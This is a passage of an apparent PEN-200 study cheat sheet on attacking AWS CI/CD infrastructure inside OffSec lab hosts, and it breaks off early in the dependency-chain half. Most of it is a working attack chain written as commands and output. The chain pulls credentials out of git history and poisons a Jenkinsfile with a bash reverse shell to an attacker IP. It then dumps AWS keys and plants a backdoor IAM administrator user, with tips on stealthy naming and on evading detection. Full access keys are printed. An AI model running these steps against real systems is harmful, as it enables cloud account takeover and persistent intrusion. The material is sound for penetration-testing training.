# Attacking AWS Cloud Infrastructure Cheat Sheet (PEN-200, Ch. 26)

CI/CD pipelines need access to source code, secrets, and AWS services/environments to do automated deployment — this expands the attack surface and makes CI/CD a prime target. Compromising a vulnerable CI/CD system in AWS commonly leads to privilege escalation deeper into the cloud account.

This module has two labs/halves:
1. **Leaked Secrets to Poisoned Pipeline** — S3 misconfig → Git credentials → poison a Jenkinsfile → reverse shell on the builder → discover more AWS keys → backdoor IAM user with `AdministratorAccess`.
2. **Dependency Chain Abuse** — missing internal Python dependency → publish malicious package to a public-facing index → code exec in production → pivot/tunnel into an internal Jenkins → vulnerable plugin leaks AWS keys → S3 bucket with a Terraform state file → admin AWS keys.

## OWASP Top 10 CI/CD Security Risks (context for the whole chapter)

| ID | Risk |
|---|---|
| CICD-SEC-1 | Insufficient Flow Control Mechanisms |
| CICD-SEC-2 | Inadequate Identity and Access Management |
| CICD-SEC-3 | Dependency Chain Abuse |
| CICD-SEC-4 | Poisoned Pipeline Execution (PPE) |
| CICD-SEC-5 | Insufficient PBAC (Pipeline-Based Access Controls) |
| CICD-SEC-6 | Insufficient Credential Hygiene |
| CICD-SEC-7 | Insecure System Configuration |
| CICD-SEC-8 | Ungoverned Usage of 3rd Party Services *(skipped in the lab — needs a 3rd-party service like GitHub)* |
| CICD-SEC-9 | Improper Artifact Integrity Validation |
| CICD-SEC-10 | Insufficient Logging and Visibility *(skipped in the lab — requires manual/organizational visibility, out of scope)* |

- **Poisoned Pipeline Execution (PPE)**: attacker gains control of the build/deploy script → reverse shell or secret theft.
- **Insufficient PBAC**: pipeline lacks proper protection of secrets/sensitive assets.
- **Insufficient Credential Hygiene**: weak controls over secrets/tokens → leak or escalation.
- **Dependency Chain Abuse**: tricking the build system into downloading malicious code (hijacked or similarly-named package).
- **Insecure System Configuration**: misconfigurations/insecure code in pipeline applications.
- **Improper Artifact Integrity Validation**: attacker injects malicious code into the pipeline without proper checks.

Lab 1 covers CICD-SEC-4, -5, -6. Lab 2 covers CICD-SEC-3, -5, -7, -9.

---

## 26.1 About the public cloud labs

OffSec's **Public Cloud Labs** differ from standard VM labs: no VPN — you interact with the cloud environment directly over the Internet.

> **Warning** — Currently, AWS labs are not accessible through In-Browser Kali.

Rules of engagement for the Public Cloud Labs:
1. Only use the lab environment for activities described/requested in the learning materials — not as a general playground.
2. Never act against any asset external to the lab (even though some modules describe attacks against vulnerable deployments for teaching purposes).
3. Standard rules against sharing OffSec training materials still apply.

> **Warning** — OffSec monitors activity in the Public Cloud Labs (including resource usage) for abnormal events unrelated to the described learning activities. Credentials/lab details are not meant to be shared.

- Sessions are time-limited; you can manually extend a session up to **ten hours**.
- No learner is required to finish a module in one sitting — note the commands/actions completed so you can restore lab state across sessions.

---

## 26.2 Leaked secrets to poisoned pipeline — lab design

Lab components (multiple services start together — can take 5–10 min to fully spin up):

| Component | Role | Hostname |
|---|---|---|
| **Gitea** | Source Code Management (SCM) — stands in for GitHub/GitLab | `git.offseclab.io` |
| **Jenkins** | Automation/CI server | `automation.offseclab.io` |
| Application | Generic app the pipeline builds | `app.offseclab.io` |

- A DNS server is provided (preconfigured with all lab hosts).
- A **cloud Kali instance** with a public IP is provided (to catch shells) — SSH as `kali` with a randomly generated password. Runs `kali-linux-headless` (no GUI) — do GUI-dependent steps (e.g., loading a page in a browser) on your **personal** Kali.
- An AWS account with **no permissions** is provided (more on this later).

### 26.2.1 Accessing the lab

Starting the lab gives you: a DNS server IP, a cloud Kali IP, a cloud Kali password, and a no-permissions AWS account.

> **Info** — No extra VPN pack is needed to reach the AWS lab DNS. Make sure you don't have an active VPN connection on your Kali machine.

```bash
# List active network connections
kali@kali:~$ nmcli connection
NAME               UUID                                  TYPE      DEVICE
Wired connection 1 67f8ac63-7383-4dfd-ae42-262991b260d7   ethernet  eth0
lo                 1284e5c4-6819-4896-8ad4-edeae32c64ce   loopback  lo

# Point your connection's DNS at the lab DNS server, then restart NetworkManager
kali@kali:~$ sudo nmcli connection modify "Wired connection 1" ipv4.dns "203.0.113.84"
kali@kali:~$ sudo systemctl restart NetworkManager
```

> **Tip** — The hosted DNS server only responds for the `offseclab.io` domain. Add additional DNS servers as a comma-separated list, e.g. `"203.0.113.84, 1.1.1.1, 8.8.8.8"`.

```bash
# Verify the change
kali@kali:~$ cat /etc/resolv.conf
kali@kali:~$ nslookup git.offseclab.io
Server:   203.0.113.84
Address:  203.0.113.84#53
Non-authoritative answer:
Name: git.offseclab.io
Address: 198.18.53.73
```

Each lab restart issues a **new** DNS IP — repeat the above. Because the lab DNS server is destroyed at lab end, remove the entry afterward:
```bash
nmcli connection modify "Wired connection 1" ipv4.dns ""
sudo systemctl restart NetworkManager
```

---

## 26.3 Enumeration

### 26.3.1 Enumerating Jenkins

Visit `automation.offseclab.io` — redirects straight to login (no self-registration visible yet ⇒ most assets are behind auth). Use Metasploit's Jenkins enum module for a baseline:

```bash
kali@kali:~$ sudo msfdb init
kali@kali:~$ msfconsole --quiet

msf6 > use auxiliary/scanner/http/jenkins_enum
msf6 auxiliary(scanner/http/jenkins_enum) > show options
# Key options: RHOSTS, TARGETURI (default /jenkins/), SSL, THREADS, VHOST

msf6 auxiliary(scanner/http/jenkins_enum) > set RHOSTS automation.offseclab.io
msf6 auxiliary(scanner/http/jenkins_enum) > set TARGETURI /
msf6 auxiliary(scanner/http/jenkins_enum) > run
[+] 198.18.53.73:80        - Jenkins Version 2.385
[*] /script restricted (403)
[*] /view/All/newJob restricted (403)
[*] /asynchPeople/ restricted (403)
[*] /systemInfo restricted (403)
```

Auth blocks deep enumeration, but the **version** alone is useful for public-exploit research.

### 26.3.2 Enumerating the Git server

Approach depends on whether the SCM is hosted (GitHub/GitLab — focus on OSINT/exposed info, brute-forcing users is ineffective against huge shared user bases) or self-hosted (exploiting the SCM software itself is in scope, brute-forcing local users may be worthwhile).

- Visit `git.offseclab.io` → note the **Gitea version** (search for public exploits later).
- Click **Explore** → Repositories tab empty (repos exist but are private) → Users tab reveals 5 users: **Billy, Jack, Lucy, Roger, Administrator**.

### 26.3.3 Enumerating the application

```bash
# Brute-force directories/routes
kali@kali:~$ dirb http://app.offseclab.io
+ http://app.offseclab.io/index.html (CODE:200|SIZE:3189)
```

`dirb` finds nothing else useful — but since this app is custom (unlike Jenkins/Gitea), **View Page Source** is worth checking. It reveals S3-hosted images:

```html
<div class="carousel-item active">
  <img src="https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/images/bunny.jpg" class="d-block w-100" alt="...">
</div>
<div class="carousel-item">
  <img src="https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/images/golden-with-flower.jpg" class="d-block w-100" alt="...">
</div>
<div class="carousel-item">
  <img src="https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/images/kittens.jpg" class="d-block w-100" alt="...">
</div>
<div class="carousel-item">
  <img src="https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/images/puppy.jpg" class="d-block w-100" alt="...">
</div>
```

> The S3 bucket name will differ in your lab instance.

No presigned URLs in the `<img>` tags ⇒ the bucket policy likely allows **public read**. Confirm with a raw `curl` of the bucket root (should return a full file listing if public):

```bash
kali@kali:~$ curl https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com
```
Root listing was disabled/empty in this case, so pivot to brute-forcing common paths directly against the bucket over HTTPS:
```bash
kali@kali:~$ head -n 51 /usr/share/wordlists/dirb/common.txt > first50.txt
kali@kali:~$ dirb https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com ./first50.txt
+ https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/.git/HEAD (CODE:200|SIZE:23)
```

Found a `.git/HEAD` ⇒ the whole bucket is a git repo. Brute-forcing every git object (random hashes) is a waste of time — pivot to using the **AWS CLI** directly instead.

> S3 buckets are commonly misconfigured with a grant to **`AuthenticatedUsers`**, which many admins confuse with "authenticated users in my own AWS account" — but it actually means *any* authenticated AWS principal, in *any* AWS account.

```bash
kali@kali:~$ aws configure
AWS Access Key ID [None]: AKIAUBHUBEGIBVQAI45N
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1        # match the region in the bucket URL
Default output format [None]:

kali@kali:~$ aws s3 ls staticcontent-lgudbhv8syu2tgbk
                     PRE .git/
                     PRE images/
                     PRE scripts/
                     PRE webroot/
2023-04-04 13:00:52  972 CONTRIBUTING.md
2023-04-04 13:00:52  79  Caddyfile
2023-04-04 13:00:52  407 Jenkinsfile
2023-04-04 13:00:52  850 README.md
2023-04-04 13:00:52  176 docker-compose.yml
```

> Due to lab limitations, this IAM user resides in the *same* AWS account as the S3 bucket. In a real engagement, any IAM user in *any* AWS account granted `AuthenticatedUsers` access gets the same result.

---

## 26.4 Discovering secrets

### 26.4.1 Downloading the bucket

```bash
# Single file
kali@kali:~$ aws s3 cp s3://staticcontent-lgudbhv8syu2tgbk/README.md ./

# Whole bucket -> a local dir named after the bucket
kali@kali:~$ aws s3 cp --recursive s3://staticcontent-lgudbhv8syu2tgbk/ ./static_content/
kali@kali:~$ cd static_content
```

> To avoid drawing attention on a live target, exfiltrate by copying **S3-to-S3** (`aws s3 cp` between buckets) rather than downloading directly — faster and buys time before detection. Always assume S3 access is monitored.

`README.md` reveals an upload helper script and lists **Lucy** and **Roger** as collaborators:
```
## How to use
...
./scripts/upload-to-s3.sh
...
# Collaborators
Lucy
Roger
```

```bash
kali@kali:~/static_content$ cat scripts/upload-to-s3.sh
# Upload images to s3
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
AWS_PROFILE=prod aws s3 sync $SCRIPT_DIR/../ s3://staticcontent-lgudbhv8syu2tgbk/
```
No secrets here — but a second script is more interesting:
```bash
kali@kali:~/static_content$ ls scripts
update-readme.sh  upload-to-s3.sh

kali@kali:~/static_content$ cat -n scripts/update-readme.sh
01 # Update Readme to include collaborators images to s3
02
03 SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
04
05 SECTION="# Collaborators"
06 FILE=$SCRIPT_DIR/../README.md
07
08 if [ "$1" == "-h" ]; then
09   echo "Update the collaborators in the README.md file"
10   exit 0
11 fi
12
13 # Check if both arguments are provided
14 if [ "$#" -ne 2 ]; then
15   echo "Usage: $0 USERNAME PASSWORD"
16   exit 1
17 fi
18
19 username=$1
20 password=$2
21 auth_header=$(printf "Authorization: Basic %s\n" "$(echo -n "$username:$password" | base64)")
22
23 USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H $auth_header | jq .\[\].username | tr -d '"')
24
25 sed -i "/^$SECTION/,/^#/{/$SECTION/d;//!d}" $FILE
26 echo "$SECTION" >> $FILE
27 echo "$USERNAMES" >> $FILE
28 echo "" >> $FILE
```
Reveals **Jack** is the repo owner (via the API path), and that the script takes a `USERNAME PASSWORD` pair on the CLI — meaning a dev's **bash history** could leak Git credentials. No secrets in the *current* version of the file, though — time to check git history.

### 26.4.2 Searching for secrets in Git

```bash
kali@kali:~/static_content$ sudo apt update && sudo apt install -y gitleaks
kali@kali:~/static_content$ gitleaks detect --source . -v
1:58PM INF no leaks found
```
Automated tools miss things — always follow up with a **manual review** of `git log`:
```bash
kali@kali:~/static_content$ git log
commit 07feec62e57fec8335e932d9fcbb9ea1f8431305 (HEAD -> master, origin/master)
Author: Jack <jack@offseclab.io>
    Add Jenkinsfile
commit 64382765366943dd1270e945b0b23dbed3024340
Author: Jack <jack@offseclab.io>
    Fix issue
commit 54166a0803785d745d68f132cde6e3859f425c75
Author: Jack <jack@offseclab.io>
    Add Management Scripts
commit 5c22f52b6e5efbb490c330f3eb39949f2dfe2f91
Author: Jack <jack@offseclab.io>
    add Docker
commit 065abcd970335c35a44e54019bb453a4abd59210
Author: Jack <jack@offseclab.io>
    Add index.html
commit 6e466ede070b7fb44e0ef38bef3504cf87e866d0
Author: Jack <jack@offseclab.io>
    Add images
commit 85c736662f2644783d1f376dcfc1688e37bd1991
Author: Jack <jack@offseclab.io>
    Init Repo
```
`git log` lists commits **newest-first**. The "Fix issue" commit is worth diffing:
```bash
kali@kali:~/static_content$ git show 64382765366943dd1270e945b0b23dbed3024340
Fix issue
diff --git a/scripts/update-readme.sh b/scripts/update-readme.sh
index 94c67fc..c2fcc19 100644
--- a/scripts/update-readme.sh
+++ b/scripts/update-readme.sh
@@ -1,4 +1,5 @@
 # Update Readme to include collaborators images to s3
+
 SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
 SECTION="# Collaborators"
@@ -9,9 +10,22 @@ if [ "$1" == "-h" ]; then
   exit 0
 fi
-USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H 'authorization: Basic YWRtaW5pc3RyYXRvcjo5bndrcWU1aGxiY21jOTFu' | jq .\[\].username | tr -d '"')
+# Check if both arguments are provided
+if [ "$#" -ne 2 ]; then
+  # If not, display a help message
+  echo "Usage: $0 USERNAME PASSWORD"
+  exit 1
+fi
+
+# Store the arguments in variables
+username=$1
+password=$2
+
+auth_header=$(printf "Authorization: Basic %s\n" "$(echo -n "$username:$password" | base64)")
+
+USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H $auth_header | jq .\[\].username | tr -d '"')
 sed -i "/^$SECTION/,/^#/{/$SECTION/d;//!d}" $FILE
 echo "$SECTION" >> $FILE
 echo "$USERNAMES" >> $FILE
-echo "" >> $FILE
+echo "" >> $FILE
```
The **old, replaced** version of the script has a hardcoded `Basic` auth header baked right in — this is a classic case: developer had a hardcoded credential, later "fixed" it to accept CLI args instead, but the credential still lives forever in git history.

```bash
kali@kali:~/static_content$ echo "YWRtaW5pc3RyYXRvcjo5bndrcWU1aGxiY21jOTFu" | base64 --decode
administrator:9nwkqe5hlbcmc91n
```
> The credentials will differ in your lab.

Login to Gitea with the decoded `administrator` credentials → full access as **Administrator**.

> **Why this matters**: git history retains every past version of every file. A hardcoded secret that's since been "fixed" in the latest commit is still fully recoverable from an old diff — always check history, not just HEAD.

---

## 26.5 Poisoning the pipeline

Pipeline definitions commonly live alongside the app source: `.gitlab-ci.yml` (GitLab), `.github/workflows/` (GitHub Actions), `Jenkinsfile` (Jenkins) — each with its own syntax. Pipelines are commonly triggered by specific events (push to main, PR opened, etc.).

### 26.5.1 Discovering pipelines in existing repositories

Now authenticated as Administrator, **Explore** again reveals the full repo list, including `static_content` (already downloaded) and its `Jenkinsfile`:

```groovy
pipeline {
    agent any
    // TODO automate the building of this later
    stages {
        stage('Build') {
            steps {
                echo 'Building..'
            }
        }
        stage('Test') {
            steps {
                echo 'Testing..'
            }
        }
        stage('Deploy') {
            steps {
                echo 'Deploying....'
            }
        }
    }
}
```
`agent any` = run on any available builder. Stages are placeholders (`echo` only) — not yet actually implemented.

A second repo, **image-transform**, holds a CloudFormation template plus a much more useful `Jenkinsfile`:

```groovy
pipeline {
    agent any

    stages {
        stage('Validate Cloudfront File') {
            steps {
                withAWS(region:'us-east-1', credentials:'aws_key') {
                    cfnValidate(file:'image-processor-template.yml')
                }
            }
        }

        stage('Create Stack') {
            steps {
                withAWS(region:'us-east-1', credentials:'aws_key') {
                    cfnUpdate(
                        stack:'image-processor-stack',
                        file:'image-processor-template.yml',
                        params:[
                            'OriginalImagesBucketName=original-images-lgudbhv8syu2tgbk',
                            'ThumbnailImageBucketName=thumbnail-images--lgudbhv8syu2tgbk'
                        ],
                        timeoutInMinutes:10,
                        pollInterval:1000)
                }
            }
        }
    }
}
```
`withAWS(...)` is provided by the **AWS Steps** Jenkins plugin — it loads named Jenkins credentials (here, `aws_key`) into env vars `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` / `AWS_DEFAULT_REGION` for the duration of the block. Whatever account backs `aws_key` needs (at minimum) permission to create/modify/delete everything the CloudFormation template touches — meaning it's likely a juicy, high-privileged credential.

The CloudFormation template itself (`image-processor-template.yml`) defines two private S3 buckets, a scheduled Lambda that copies/thumbnails images between them, and an IAM Role for the Lambda:

```yaml
AWSTemplateFormatVersion: '2010-09-09'
Parameters:
  OriginalImagesBucketName:
    Type: String
  ThumbnailImageBucketName:
    Type: String

Resources:
  # S3 buckets for storing original and thumbnail images
  OriginalImagesBucket:
    Type: AWS::S3::Bucket
    Properties:
      BucketName: !Ref OriginalImagesBucketName
      AccessControl: Private
  ThumbnailImagesBucket:
    Type: AWS::S3::Bucket
    Properties:
      BucketName: !Ref ThumbnailImageBucketName
      AccessControl: Private

  ImageProcessorFunction:
    Type: 'AWS::Lambda::Function'
    Properties:
      FunctionName: ImageTransform
      Handler: index.lambda_handler
      Runtime: python3.9
      Role: !GetAtt ImageProcessorRole.Arn
      MemorySize: 1024
      Environment:
        Variables:
          # S3 bucket names
          ORIGINAL_IMAGES_BUCKET: !Ref OriginalImagesBucket
          THUMBNAIL_IMAGES_BUCKET: !Ref ThumbnailImagesBucket
      Code:
        ZipFile: |
          import boto3
          import os
          import json

          SOURCE_BUCKET = os.environ['ORIGINAL_IMAGES_BUCKET']
          DESTINATION_BUCKET = os.environ['THUMBNAIL_IMAGES_BUCKET']

          # NOTE: source scan of this inline ZipFile body is heavily OCR-corrupted in the
          # original; reconstructed logic per the surrounding narrative — it iterates
          # objects in SOURCE_BUCKET and copies/resizes each into DESTINATION_BUCKET:
          def lambda_handler(event, context):
              s3 = boto3.resource('s3')
              bucket = s3.Bucket(SOURCE_BUCKET)
              for obj in bucket.objects.all():
                  key = obj.key
                  new_key = key
                  copy_source = {'Bucket': SOURCE_BUCKET, 'Key': key}
                  # copy the object to the destination bucket, resized to the desirable size
                  s3.meta.client.copy(copy_source, DESTINATION_BUCKET, new_key)
              return {
                  'statusCode': 200,
                  'body': json.dumps('Success')
              }

  ImageProcessorScheduleRule:
    Type: AWS::Events::Rule
    Properties:
      Description: "Runs the ImageProcessorFunction daily"
      ScheduleExpression: rate(1 day)
      State: ENABLED
      Targets:
        - Arn: !GetAtt ImageProcessorFunction.Arn
          Id: ImageProcessorFunctionTarget

  ImageProcessorRole:
    Type: AWS::IAM::Role
    Properties:
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - lambda.amazonaws.com
            Action:
              - sts:AssumeRole
      Path: "/"
      Policies:
        - PolicyName: ImageProcessorLogPolicy
          PolicyDocument:
            Version: '2012-10-17'
            Statement:
              - Effect: Allow
                Action:
                  - logs:CreateLogGroup
                  - logs:CreateLogStream
                  - logs:PutLogEvents
                Resource: "*"
        - PolicyName: ImageProcessorS3Policy
          PolicyDocument:
            Version: '2012-10-17'
            Statement:
              - Effect: Allow
                Action:
                  - "s3:GetObject"
                  - "s3:PutObject"
                  - "s3:AbortMultipartUpload"
                  - "s3:ListBucket"
                  - "s3:DeleteObject"
                  - "s3:GetObjectVersion"
                  - "s3:ListMultipartUploadParts"
                Resource:
                  - !Sub arn:aws:s3:::${OriginalImagesBucket}
                  - !Sub arn:aws:s3:::${OriginalImagesBucket}/*
                  - !Sub arn:aws:s3:::${ThumbnailImagesBucket}
                  - !Sub arn:aws:s3:::${ThumbnailImagesBucket}/*
```
The **Lambda's own role** is scoped only to logging + the two S3 buckets — not very lucrative. The real prize is the **`aws_key`** Jenkins credential itself, since it must be privileged enough to `cfnUpdate` this whole stack.

We have edit access to the repo (as Administrator) — but we still need the pipeline to actually **run**. Check **Settings → Webhooks** in Gitea:
- A webhook is configured to fire the Jenkins job on **Git Push** — so committing our edited `Jenkinsfile` is enough to trigger a build.

### 26.5.2 Modifying the pipeline

Build the payload iteratively (edit in a text editor first, push later):

```groovy
# 1. Minimal valid pipeline
pipeline {
   agent any
   stages {
       stage('Build') {
          steps {
              echo 'Building..'
          }
       }
   }
}
```
```groovy
# 2. Retain the aws_key credentials via withAWS
pipeline {
   agent any
   stages {
       stage('Build') {
          steps {
              withAWS(region: 'us-east-1', credentials: 'aws_key') {
                  echo 'Building..'
              }
          }
       }
   }
}
```
```groovy
# 3. Add a script block for more flexibility (e.g. OS checks)
pipeline {
   agent any
   stages {
      stage('Build') {
          steps {
             withAWS(region: 'us-east-1', credentials: 'aws_key') {
                script {
                   echo 'Building..'
                }
             }
          }
      }
   }
}
```

> **Gotcha** — Groovy in the `script {}` block runs in a **sandbox** with very limited access to internal Jenkins/Java APIs. You can create variables, but you generally can't reach the APIs needed for a shell — and an admin may need to approve unsandboxed scripts. **Avoid writing your reverse shell in Groovy.**

Instead, use the **Nodes and Processes** plugin's `sh` step (extremely common — bundled/maintained by Jenkins itself) to run real shell commands:

```groovy
# 4. Callback test via curl (only works on *nix agents)
pipeline {
   agent any
   stages {
       stage('Build') {
          steps {
              withAWS(region: 'us-east-1', credentials: 'aws_key') {
                  script {
                     sh 'curl http://192.88.99.76/'
                  }
              }
          }
       }
   }
}
```
```groovy
# 5. Guard with isUnix() so it doesn't crash a Windows agent
pipeline {
   agent any
   stages {
      stage('Build') {
          steps {
             withAWS(region: 'us-east-1', credentials: 'aws_key') {
                script {
                  if (isUnix()) {
                     sh 'curl http://192.88.99.76/unix'
                  }
                }
             }
          }
      }
   }
}
```
```bash
# On the cloud Kali instance: start a listener + web server to catch the callback
kali@kali:~$ ssh kali@192.88.99.76
kali@cloud-kali:~$ sudo systemctl start apache2
```
Push the edited `Jenkinsfile` via the Gitea web UI (Edit → paste → Commit) — the webhook fires the build automatically. Confirm the callback in Apache's access log (`GET /unix` = 404 is fine, it just proves execution happened), then swap in a real reverse shell:

```groovy
pipeline {
   agent any
   stages {
      stage('Send Reverse Shell') {
         steps {
            withAWS(region: 'us-east-1', credentials: 'aws_key') {
               script {
                  if (isUnix()) {
                     sh 'bash -c "bash -i >& /dev/tcp/192.88.99.76/4242 0>&1" & '
                  }
               }
            }
         }
      }
   }
}
```
```bash
bash -i >& /dev/tcp/192.88.99.76/4242 0>&1
```
Breakdown: run interactive bash (`-i`), redirect stdout+stderr (`>&`) to a TCP socket to the Kali box, and redirect stdin from that same socket back into bash. Wrapping in `bash -c "PAYLOAD" &` ensures the redirections execute in a real bash environment and backgrounds it so the build step doesn't hang/timeout waiting on the shell.

```bash
# Set up the listener on cloud Kali first
kali@cloud-kali:~$ nc -nvlp 4242
listening on [any] 4242 ...
connect to [10.0.1.78] from (UNKNOWN) [198.18.53.73] 54980
jenkins@5e0ed1dc7ffe:~/agent/workspace/image-transform$ whoami
jenkins
```

### 26.5.3 Enumerating the builder

```bash
jenkins@fcd3cc360d9e:~/agent/workspace/image-transform$ uname -a
Linux fcd3cc360d9e 4.14.309-231.529.amzn2.x86_64 #1 SMP ... x86_64 GNU/Linux

jenkins@fcd3cc360d9e:~/agent/workspace/image-transform$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
```
Debian userland on an **Amazon Linux kernel** — a strong container signal on its own.

```bash
jenkins@fcd3cc360d9e:~$ ls -a .ssh
authorized_keys
jenkins@fcd3cc360d9e:~$ cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP+HH9VS2Oe1djuSNJWhbYaswUC544I0QCp8sSdyTs/yQ... jenkins@jenkins
```
No private key found, but the presence of an `authorized_keys` explains how the Jenkins **controller** orchestrates the **agent**.

```bash
jenkins@fcd3cc360d9e:~$ ifconfig      # command not found
jenkins@fcd3cc360d9e:~$ ip a          # command not found (minimal container image)
jenkins@fcd3cc360d9e:~$ cat /proc/mounts
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/...
...
/dev/xvda1 /home/jenkins xfs rw,noatime,attr2,inode64,noquota 0 0
```
Confirms containerization (overlay root fs, docker paths). Check Linux **capabilities**:
```bash
jenkins@fcd3cc360d9e:~$ cat /proc/self/status | grep Cap
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
```bash
kali@kali:~$ capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,...,cap_net_admin,cap_net_raw,...,cap_sys_admin,...
```
Presence of `cap_net_admin` and `cap_sys_admin` suggests the container runs privileged (or with all caps added) — but we're a non-root `jenkins` user, so exploiting this would need a **local privesc to root inside the container** first, then a **container-escape**.

A faster win: the reverse shell already inherited the AWS credentials from `withAWS`.

```bash
jenkins@fcd3cc360d9e:~$ env | grep AWS
AWS_DEFAULT_REGION=us-east-1
AWS_REGION=us-east-1
AWS_SECRET_ACCESS_KEY=W4gtNvsaeVgx5278oy5AXqA9XbWdkRWfKNamjKXo
AWS_ACCESS_KEY_ID=AKIAUBHUBEGIMU2Y5GY7
```

> **Why this matters**: any `sh` step that has a `withAWS` (or similar credential-binding) wrapper around it exposes those credentials to the *entire* shell environment for that step — not just to the specific AWS SDK call the pipeline author intended.

---

## 26.6 Escalating privileges and backdooring the account

> A common technique after gaining initial cloud access is escalating to an **AdministratorAccess**-equivalent account and planting a **backdoor IAM user**, which enables ongoing exploitation/persistence even if the original foothold is remediated.

### 26.6.1 Discovering what we have access to

Options to learn your own permission boundary:
1. Best case: the account can list its own attached policies.
2. Brute-force every API call and log which succeed — noisy, avoid when possible.

```bash
kali@kali:~$ aws configure --profile=CompromisedJenkins
AWS Access Key ID [None]: AKIAUBHUBEGIMU2Y5GY7
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1

kali@kali:~$ aws --profile CompromisedJenkins sts get-caller-identity
{
    "UserId": "AIDAUBHUBEGILTF7TFWME",
    "Account": "274737132808",
    "Arn": "arn:aws:iam::274737132808:user/system/jenkins-admin"
}
```

| Policy attachment type | Description |
|---|---|
| **Inline Policy** | Attached only to a single specific user |
| **Managed Policy Attached** | Custom- or AWS-managed policy attached directly to a user |
| **Group Attached Policy** | Inline or managed policy attached to a group the user belongs to |

```bash
kali@kali:~$ aws --profile CompromisedJenkins iam list-user-policies --user-name jenkins-admin
{ "PolicyNames": [ "jenkins-admin-role" ] }

kali@kali:~$ aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin
{ "AttachedPolicies": [] }

kali@kali:~$ aws --profile CompromisedJenkins iam list-groups-for-user --user-name jenkins-admin
{ "Groups": [] }

kali@kali:~$ aws --profile CompromisedJenkins iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role
{
    "UserName": "jenkins-admin",
    "PolicyName": "jenkins-admin-role",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "",
                "Effect": "Allow",
                "Action": "*",
                "Resource": "*"
            }
        ]
    }
}
```
`"Action": "*", "Resource": "*"` = **full administrator** access via this single inline policy.

### 26.6.2 Creating a backdoor account

> In this example the backdoor username is `backdoor`; in a real engagement, choose something stealthier that blends in — e.g. `terraform-admin`.

```bash
# 1. Create the backdoor user
kali@kali:~$ aws --profile CompromisedJenkins iam create-user --user-name backdoor
{
    "User": {
        "Path": "/",
        "UserName": "backdoor",
        "UserId": "AIDAUBHUBEGIPX2SBIHLB",
        "Arn": "arn:aws:iam::274737132808:user/backdoor"
    }
}

# 2. Attach the AWS-managed AdministratorAccess policy
kali@kali:~$ aws --profile CompromisedJenkins iam attach-user-policy \
    --user-name backdoor \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. Mint an access key for the backdoor user
kali@kali:~$ aws --profile CompromisedJenkins iam create-access-key --user-name backdoor
{
    "AccessKey": {
        "UserName": "backdoor",
        "AccessKeyId": "AKIAUBHUBEGIDGCLUM53",
        "Status": "Active",
        "SecretAccessKey": "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"
    }
}

# 4. Configure a local profile with it, then confirm
kali@kali:~$ aws configure --profile=backdoor
AWS Access Key ID [None]: AKIAUBHUBEGIDGCLUM53
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1

kali@kali:~$ aws --profile backdoor iam list-attached-user-policies --user-name backdoor
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```
Result: full administrative privileges in the target account, plus a **persistent backdoor user** for long-term access.

---

## 26.7 Dependency chain abuse

Recap of relevant OWASP CI/CD risks: **Dependency Chain Abuse** (malicious/hijacked/similarly-named package tricking the build system), **Insufficient PBAC** (excessive pipeline permissions), **Insecure System Configuration**, **Improper Artifact Integrity Validation** (no checks on what enters the pipeline).

Attack roadmap for this half: exploit public info about a missing internal dependency → publish a malicious package → get it executed in production → scan the internal network → tunnel into the automation server → exploit a Jenkins plugin vuln for AWS keys → find a Terraform state file with admin AWS keys.

### 26.7.1 Accessing the lab

Same DNS setup as 26.2.1, plus a **pip client** configuration step (repeat on the cloud Kali too if you need pip there):

```bash
kali@kali:~$ nmcli connection
kali@kali:~$ nmcli connection modify "Wired connection 1" ipv4.dns "203.0.113.84"
kali@kali:~$ sudo systemctl restart NetworkManager
kali@kali:~$ cat /etc/resolv.conf
kali@kali:~$ nslookup ...
```
> **Tip** — add extra DNS servers as a comma list, e.g. `"203.0.113.84, 1.1.1.1, 8.8.8.8"`.

```bash
kali@kali:~$ mkdir -p ~/.config/pip/
kali@kali:~$ nano ~/.config/pip/pip.conf
```
```ini
[global]
index-url = http://pypi.offseclab.io
trusted-host = pypi.offseclab.io
```
`[global]` applies to every pip invocation for the user. `trusted-host` is required because the replacement index is plain HTTP.

---

## 26.8 Information gathering

### 26.8.1 Enumerating the target application

Target app: **HackShort** — a URL shortener with a documented API. Visiting the docs and generating an API token isn't the main path here (attacking the app itself is out of scope for this exercise — normally you'd spend real time on it with Burp).

